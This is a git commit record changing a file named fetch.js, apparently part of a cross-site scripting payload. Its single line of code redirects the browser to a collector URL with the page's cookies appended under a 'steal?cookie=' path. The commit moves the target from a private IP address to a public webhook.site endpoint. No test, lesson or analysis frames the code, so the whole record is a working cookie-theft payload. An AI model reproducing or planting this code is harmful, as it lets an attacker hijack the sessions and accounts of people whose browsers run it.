a45ba6a8d3a6052bc931029bf6b35fac9f3d5644
4ndr34z <andreas@f20.be>
2025-07-24 07:56:47 +0200

    Update fetch.js

--- fetch.js
+++ fetch.js
@@ -1,2 +1,2 @@
-document.location='http://192.168.16.78/steal?cookie='+document.cookie;
+document.location='https://webhook.site/de10b493-069d-404e-ac06-538f764261fb/steal?cookie='+document.cookie;
 
